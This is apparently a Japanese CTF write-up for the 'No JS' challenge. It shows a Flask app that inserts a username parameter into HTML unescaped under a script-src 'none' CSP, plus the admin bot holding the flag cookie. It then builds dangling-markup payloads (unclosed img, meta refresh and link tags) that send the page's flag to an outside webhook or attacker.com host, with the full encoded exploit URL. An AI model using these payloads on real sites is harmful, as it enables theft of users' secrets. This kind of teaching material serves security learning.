# No JS

## / Overview

CSPで`script-src 'none'`が設定されたWebアプリケーションにおいて、JavaScriptを一切使わずにHTMLインジェクションでフラグを取得する問題。

## / Writeup

この問題では、Content-Security-Policy (CSP)によってJavaScriptの実行が完全にブロックされたWebアプリケーションが提供されます。しかし、HTMLの構造を利用することで、JavaScriptを使わずにフラグを外部に送信できます。

### アプリケーションの分析

`app.py`を見ると、次のような動作をするFlaskアプリケーションが実装されています:

```python
@app.get("/")
def index():
    username = request.args.get("username", "guest")
    flag = request.cookies.get("flag", "no_flag")
    html = """<!doctype html>
<html>
<head>
    <meta charset="utf-8">
</head>
<body>
    <p>Hello [[username]]!</p>
    <p>Your flag is here: [[flag]]</p>
    <form>
        <input name="username" placeholder="What's your name?"><br>
        <button type="submit">Render</button>
    </form>
</body></html>"""
    # Remove spaces/linebreaks
    html = re.sub(r">\s+<", "><", html)

    # Simple templating system
    html = html.replace("[[flag]]", flag)
    html = html.replace("[[username]]", username)

    response = Response(html, mimetype="text/html")
    # This Content-Security-Policy (or CSP) header prevents any Javascript from running!
    response.headers["Content-Security-Policy"] = "script-src 'none'"
    return response
```

重要なポイントは
- `username`パラメータがHTMLに直接埋め込まれる
- CSPで`script-src 'none'`が設定されているため、`<script>`タグやイベントハンドラ (`onclick`, `onerror`など)は**全てブロック**される
- フラグはCookieに保存されているが、**HTMLの中に`[[flag]]`として表示される**

### Bot の動作

`bot.js`を確認すると、Botは次のように動作します:

```javascript
await browser.setCookie({
  "name": "flag",
  "value": FLAG,
  "domain": new URL(APP_URL).hostname,
  "path": "/",
  "httpOnly": true,
})

const page = await browser.newPage();
await page.goto(url, { timeout: 5000 });
await sleep(5000);
await page.close();
```

Botは報告されたURLを訪問し、フラグCookieを持った状態で5秒間待機します。

### 攻撃手法

JavaScriptが使えない場合でも、リダイレクト、画像、スタイルシートなどを読み込む際、ブラウザは自動的にHTTPリクエストを送信します。

次のペイロードを考えます:

```html
<img src="https://<webhook.siteなどのURL>/?
```

もしくは次のようなものも使えます。

```html
<meta http-equiv="refresh" content="0;URL=https://<webhook.siteなどのURL>/?
<link rel="stylesheet" href="https://<webhook.siteなどのURL>/?
```

今回は`<img>`タグを使います。このペイロードを`username`パラメータに注入すると、HTMLは次のように書き換わります:

```html
<p>Hello <img src="https://<webhook.siteなどのURL>/?!</p><p>Your flag is here: Alpaca{...}</p>
```

引用符で開始された属性値（`src="`）は、**次の引用符または改行まで**続きます。そのため、`usename` よりも後に配置されている `flag` はクエリストリングの一部として解釈されます。


実際には、後続のHTMLに`<form>`タグがあり、そこに含まれる`placeholder="What's your name?"`の最初の`"`で属性値が閉じられます:

```html
<img src="https://<webhook.siteなどのURL>/?!</p><p>Your flag is here: Alpaca{...}</p><form><input name="username" placeholder="What's your name?">
```

つまり、`src`属性の値は:

```
https://attacker.com/?!</p><p>Your flag is here: Alpaca{...}</p><form><input name="username" placeholder=
```

と解釈されます。

### ペイロードの構築

最終的にペイロードは:

```
<img src="https://<webhook.siteなどのURL>/?
```

URLエンコードすると:

```
%3Cimg%20src%3D%22https%3A%2F%2F<webhook.siteなどのURL>%2F%3F
```

完全なURLは:

```
http://web:3000/?username=%3Cimg%20src%3D%22https%3A%2F%2F<webhook.siteなどのURL>%2F%3F
```

これを `admin bot` に入力すると、フラグが得られます。

### 注意

`admin bot` からURLを送信するときに、**Enterを押しても処理されません**。右の `Report` ボタンを押すことでサーバーで処理されます。